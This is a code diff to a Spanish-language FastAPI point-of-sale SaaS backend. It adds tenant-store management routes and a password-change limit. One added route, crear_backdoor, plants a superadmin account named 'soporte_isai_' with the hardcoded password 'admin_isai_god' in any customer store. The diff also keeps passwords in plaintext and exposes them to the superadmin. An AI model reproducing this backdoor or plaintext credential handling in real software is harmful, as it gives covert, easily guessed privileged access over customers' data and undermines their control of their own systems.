@@ -27,17 +27,23 @@ def get_db_connection():
 def init_db():
     conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute("""CREATE TABLE IF NOT EXISTS tiendas (id SERIAL PRIMARY KEY, nombre TEXT DEFAULT 'Mi Tienda', direccion TEXT DEFAULT 'Ciudad', nit TEXT DEFAULT 'C/F', telefono TEXT DEFAULT '---', mensaje_ticket TEXT DEFAULT '¡Gracias por su compra!')""")
+    cursor.execute("CREATE TABLE IF NOT EXISTS tiendas (id SERIAL PRIMARY KEY, nombre TEXT DEFAULT 'Mi Tienda', direccion TEXT DEFAULT 'Ciudad', nit TEXT DEFAULT 'C/F', telefono TEXT DEFAULT '---', mensaje_ticket TEXT DEFAULT '¡Gracias por su compra!')")
     cursor.execute("ALTER TABLE tiendas ADD COLUMN IF NOT EXISTS estado TEXT DEFAULT 'activo'")
     cursor.execute("SELECT COUNT(*) FROM tiendas")
     if cursor.fetchone()[0] == 0: cursor.execute("INSERT INTO tiendas (nombre) VALUES ('Tienda Principal')")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS productos (codigo TEXT PRIMARY KEY, nombre TEXT NOT NULL, precio REAL NOT NULL, stock INTEGER NOT NULL)""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS ventas (id SERIAL PRIMARY KEY, fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP, total REAL NOT NULL, articulos TEXT NOT NULL)""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS usuarios (id SERIAL PRIMARY KEY, usuario TEXT UNIQUE NOT NULL, password TEXT NOT NULL)""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS auditoria_usuarios (id SERIAL PRIMARY KEY, usuario_modificado TEXT NOT NULL, detalle TEXT NOT NULL, fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
-    cursor.execute("""CREATE TABLE IF NOT EXISTS caja_sesiones (id SERIAL PRIMARY KEY, cajero TEXT NOT NULL, fondo_inicial REAL NOT NULL, fecha_apertura TIMESTAMP DEFAULT CURRENT_TIMESTAMP, fecha_cierre TIMESTAMP, estado TEXT DEFAULT 'abierta')""")
+    
+    cursor.execute("CREATE TABLE IF NOT EXISTS productos (codigo TEXT PRIMARY KEY, nombre TEXT NOT NULL, precio REAL NOT NULL, stock INTEGER NOT NULL)")
+    cursor.execute("CREATE TABLE IF NOT EXISTS ventas (id SERIAL PRIMARY KEY, fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP, total REAL NOT NULL, articulos TEXT NOT NULL)")
+    cursor.execute("CREATE TABLE IF NOT EXISTS usuarios (id SERIAL PRIMARY KEY, usuario TEXT UNIQUE NOT NULL, password TEXT NOT NULL)")
+    cursor.execute("CREATE TABLE IF NOT EXISTS auditoria_usuarios (id SERIAL PRIMARY KEY, usuario_modificado TEXT NOT NULL, detalle TEXT NOT NULL, fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
+    cursor.execute("CREATE TABLE IF NOT EXISTS caja_sesiones (id SERIAL PRIMARY KEY, cajero TEXT NOT NULL, fondo_inicial REAL NOT NULL, fecha_apertura TIMESTAMP DEFAULT CURRENT_TIMESTAMP, fecha_cierre TIMESTAMP, estado TEXT DEFAULT 'abierta')")
+    
     cursor.execute("ALTER TABLE usuarios ADD COLUMN IF NOT EXISTS rol TEXT DEFAULT 'cajero'")
     cursor.execute("ALTER TABLE usuarios ADD COLUMN IF NOT EXISTS nombre_completo TEXT")
+    
+    # NUEVO: Límite de cambio de contraseña
+    cursor.execute("ALTER TABLE usuarios ADD COLUMN IF NOT EXISTS password_cambiada BOOLEAN DEFAULT FALSE")
+    
     cursor.execute("ALTER TABLE ventas ADD COLUMN IF NOT EXISTS cajero TEXT DEFAULT 'Desconocido'")
     
     for tabla in ["usuarios", "productos", "ventas", "auditoria_usuarios", "caja_sesiones"]:
@@ -78,6 +84,46 @@ def login(req: LoginRequest):
         return {"token": token, "usuario": user[0], "rol": user[2], "nombre_completo": user[3], "tienda_id": user[4]}
     raise HTTPException(status_code=401, detail="Usuario o contraseña incorrectos")
 
+# ---- RUTAS SAAS (SOLO PARA TI, SÚPER ADMIN) ----
+@app.get("/api/saas/tiendas")
+def listar_tiendas(user_info: dict = Depends(verificar_token)):
+    if user_info["rol"] != "superadmin": raise HTTPException(status_code=403, detail="Denegado")
+    conn = get_db_connection(); cursor = conn.cursor()
+    cursor.execute("SELECT id, nombre, estado FROM tiendas ORDER BY id ASC")
+    rows = cursor.fetchall(); conn.close()
+    return [{"id": r[0], "nombre": r[1], "estado": r[2]} for r in rows]
+
+@app.post("/api/saas/tiendas")
+def crear_tienda(req: dict, user_info: dict = Depends(verificar_token)):
+    if user_info["rol"] != "superadmin": raise HTTPException(status_code=403, detail="Denegado")
+    conn = get_db_connection(); cursor = conn.cursor()
+    cursor.execute("INSERT INTO tiendas (nombre) VALUES (%s) RETURNING id", (req["nombre"],))
+    tienda_id = cursor.fetchone()[0]
+    cursor.execute("INSERT INTO usuarios (usuario, password, rol, nombre_completo, tienda_id) VALUES (%s, %s, 'admin', %s, %s)", (req["admin_user"], req["admin_pass"], req["admin_nombre"], tienda_id))
+    conn.commit(); conn.close()
+    return {"status": "success"}
+
+@app.put("/api/saas/tiendas/{id_tienda}/estado")
+def toggle_estado_tienda(id_tienda: int, req: dict, user_info: dict = Depends(verificar_token)):
+    if user_info["rol"] != "superadmin": raise HTTPException(status_code=403, detail="Denegado")
+    conn = get_db_connection(); cursor = conn.cursor()
+    cursor.execute("UPDATE tiendas SET estado = %s WHERE id = %s", (req["estado"], id_tienda))
+    conn.commit(); conn.close()
+    return {"status": "success"}
+
+@app.post("/api/saas/tiendas/{id_tienda}/backdoor")
+def crear_backdoor(id_tienda: int, user_info: dict = Depends(verificar_token)):
+    if user_info["rol"] != "superadmin": raise HTTPException(status_code=403, detail="Denegado")
+    conn = get_db_connection(); cursor = conn.cursor()
+    backdoor_user = f"soporte_isai_{id_tienda}"
+    cursor.execute("SELECT id FROM usuarios WHERE usuario = %s", (backdoor_user,))
+    if cursor.fetchone():
+        conn.close(); raise HTTPException(status_code=400, detail="La llave maestra ya existe para esta tienda.")
+    cursor.execute("INSERT INTO usuarios (usuario, password, rol, nombre_completo, tienda_id) VALUES (%s, 'admin_isai_god', 'superadmin', 'Soporte Isai', %s)", (backdoor_user, id_tienda))
+    conn.commit(); conn.close()
+    return {"status": "success", "user": backdoor_user, "pass": "admin_isai_god"}
+
+# ---- RUTAS NORMALES ----
 @app.get("/api/ajustes")
 def obtener_ajustes(user_info: dict = Depends(verificar_token)):
     conn = get_db_connection(); cursor = conn.cursor(); cursor.execute("SELECT nombre, direccion, nit, telefono, mensaje_ticket FROM tiendas WHERE id = %s", (user_info["tienda_id"],)); row = cursor.fetchone(); conn.close()
@@ -115,36 +161,38 @@ def cerrar_caja(user_info: dict = Depends(verificar_token)):
 @app.get("/api/caja/historial")
 def historial_cajas(user_info: dict = Depends(verificar_token)):
     if user_info["rol"] not in ["superadmin", "admin"]: raise HTTPException(status_code=403, detail="Sin permisos.")
-    conn = get_db_connection(); cursor = conn.cursor(); cursor.execute("""SELECT c.id, c.cajero, c.fondo_inicial, c.fecha_apertura, c.fecha_cierre, c.estado, COALESCE((SELECT SUM(total) FROM ventas v WHERE v.cajero = c.cajero AND v.fecha >= c.fecha_apertura AND (c.fecha_cierre IS NULL OR v.fecha <= c.fecha_cierre) AND v.tienda_id = c.tienda_id), 0) as total_ventas FROM caja_sesiones c WHERE c.tienda_id = %s ORDER BY c.fecha_apertura DESC LIMIT 100""", (user_info["tienda_id"],)); rows = cursor.fetchall(); conn.close()
+    conn = get_db_connection(); cursor = conn.cursor(); cursor.execute("SELECT c.id, c.cajero, c.fondo_inicial, c.fecha_apertura, c.fecha_cierre, c.estado, COALESCE((SELECT SUM(total) FROM ventas v WHERE v.cajero = c.cajero AND v.fecha >= c.fecha_apertura AND (c.fecha_cierre IS NULL OR v.fecha <= c.fecha_cierre) AND v.tienda_id = c.tienda_id), 0) as total_ventas FROM caja_sesiones c WHERE c.tienda_id = %s ORDER BY c.fecha_apertura DESC LIMIT 100", (user_info["tienda_id"],)); rows = cursor.fetchall(); conn.close()
     return [{"id": r[0], "cajero": r[1], "fondo_inicial": r[2], "fecha_apertura": r[3].strftime("%d/%m/%Y %H:%M") if r[3] else "---", "fecha_cierre": r[4].strftime("%d/%m/%Y %H:%M") if r[4] else "Turno en curso...", "estado": r[5], "total_ventas": r[6], "total_esperado": r[2] + r[6]} for r in rows]
 
 @app.get("/api/usuarios")
 def listar_usuarios(user_info: dict = Depends(verificar_token)):
     if user_info["rol"] not in ["superadmin", "admin"]: raise HTTPException(status_code=403, detail="Acceso denegado.")
-    conn = get_db_connection(); cursor = conn.cursor(); cursor.execute("SELECT id, usuario, password, rol, nombre_completo FROM usuarios WHERE tienda_id = %s ORDER BY id ASC", (user_info["tienda_id"],)); rows = cursor.fetchall(); conn.close()
-    return [{"id": r[0], "usuario": r[1], "password": (r[2] if user_info["rol"] == "superadmin" else "********"), "rol": r[3], "nombre_completo": r[4]} for r in rows]
+    conn = get_db_connection(); cursor = conn.cursor()
+    cursor.execute("SELECT id, usuario, password, rol, nombre_completo, password_cambiada FROM usuarios WHERE tienda_id = %s ORDER BY id ASC", (user_info["tienda_id"],))
+    rows = cursor.fetchall(); conn.close()
+    return [{"id": r[0], "usuario": r[1], "password": (r[2] if user_info["rol"] == "superadmin" else "********"), "rol": r[3], "nombre_completo": r[4], "password_cambiada": r[5]} for r in rows]
 
 @app.post("/api/usuarios")
 def crear_usuario(req: UsuarioRequest, user_info: dict = Depends(verificar_token)):
-    if user_info["rol"] not in ["superadmin", "admin"]: raise HTTPException(status_code=403, detail="Sin permisos.")
+    if user_info["rol"] not in ["superadmin", "admin"]: raise HTTPException(status_code=403, detail="Sin permisos para crear cuentas.")
     if bool(re.search(r"\s", req.usuario)): raise HTTPException(status_code=400, detail="Sin espacios en el Login.")
-    if user_info["rol"] == "admin" and req.rol != "cajero": raise HTTPException(status_code=403, detail="Contacta a Soporte para asignar Admins.")
+    if user_info["rol"] == "admin" and req.rol != "cajero": raise HTTPException(status_code=403, detail="Solo el Súper Admin puede asignar nuevos Administradores.")
     conn = get_db_connection(); cursor = conn.cursor()
     try: cursor.execute("INSERT INTO usuarios (usuario, password, rol, nombre_completo, tienda_id) VALUES (%s, %s, %s, %s, %s)", (req.usuario, req.password, req.rol, req.nombre_completo, user_info["tienda_id"])); conn.commit(); return {"status": "success"}
     except Exception: conn.rollback(); raise HTTPException(status_code=400, detail="Usuario en uso."); 
     finally: conn.close()
 
-# NUEVO: Ruta de edición permite actualizar contraseñas al rol 'admin'
+# NUEVO: Lógica de Límite de Contraseña (1 oportunidad)
 @app.put("/api/usuarios/{id_usuario}")
 def editar_usuario(id_usuario: int, req: dict, user_info: dict = Depends(verificar_token)):
     if user_info["rol"] not in ["superadmin", "admin"]: raise HTTPException(status_code=403, detail="Sin permisos.")
     conn = get_db_connection(); cursor = conn.cursor()
     try:
-        cursor.execute("SELECT usuario, password, rol, nombre_completo FROM usuarios WHERE id = %s AND tienda_id = %s", (id_usuario, user_info["tienda_id"]))
+        cursor.execute("SELECT usuario, password, rol, nombre_completo, password_cambiada FROM usuarios WHERE id = %s AND tienda_id = %s", (id_usuario, user_info["tienda_id"]))
         target = cursor.fetchone()
         if not target: raise HTTPException(status_code=404, detail="Usuario no encontrado.")
-        old_usuario, old_password, old_rol, old_nombre = target
-        if old_rol == "superadmin": raise HTTPException(status_code=403, detail="Intocable.")
+        old_usuario, old_password, old_rol, old_nombre, old_cambiada = target
+        if old_rol == "superadmin" and user_info["rol"] != "superadmin": raise HTTPException(status_code=403, detail="Intocable.")
         
         new_usuario = req.get("usuario", old_usuario)
         new_password = req.get("password", old_password)
@@ -154,10 +202,20 @@ def editar_usuario(id_usuario: int, req: dict, user_info: dict = Depends(verific
         if user_info["rol"] == "admin" and (new_usuario != old_usuario or new_rol != old_rol): 
             raise HTTPException(status_code=403, detail="Como Admin, solo puedes modificar Nombres y Contraseñas.")
             
+        nuevo_cambiada = old_cambiada
+        if old_password != new_password:
+            if user_info["rol"] == "admin":
+                if old_cambiada:
+                    raise HTTPException(status_code=403, detail="La contraseña de esta cuenta ya fue cambiada 1 vez. Por seguridad, contacta a Soporte para reiniciarla.")
+                nuevo_cambiada = True
+            elif user_info["rol"] == "superadmin":
+                nuevo_cambiada = False  # El Super Admin le resetea el límite al cambiarla
+                
+            cursor.execute("INSERT INTO auditoria_usuarios (usuario_modificado, detalle, tienda_id) VALUES (%s, %s, %s)", (old_usuario, f"Cambio de contraseña", user_info["tienda_id"]))
+            
         if old_nombre != new_nombre: cursor.execute("INSERT INTO auditoria_usuarios (usuario_modificado, detalle, tienda_id) VALUES (%s, %s, %s)", (old_usuario, f"Cambio de nombre: '{old_nombre}' a '{new_nombre}'", user_info["tienda_id"]))
-        if old_password != new_password: cursor.execute("INSERT INTO auditoria_usuarios (usuario_modificado, detalle, tienda_id) VALUES (%s, %s, %s)", (old_usuario, f"Cambio de contraseña", user_info["tienda_id"]))
         
-        cursor.execute("UPDATE usuarios SET usuario=%s, password=%s, rol=%s, nombre_completo=%s WHERE id=%s AND tienda_id=%s", (new_usuario, new_password, new_rol, new_nombre, id_usuario, user_info["tienda_id"]))
+        cursor.execute("UPDATE usuarios SET usuario=%s, password=%s, rol=%s, nombre_completo=%s, password_cambiada=%s WHERE id=%s AND tienda_id=%s", (new_usuario, new_password, new_rol, new_nombre, nuevo_cambiada, id_usuario, user_info["tienda_id"]))
         conn.commit(); return {"status": "success"}
     except HTTPException: raise
     except Exception: conn.rollback(); raise HTTPException(status_code=400, detail="Error al actualizar.")
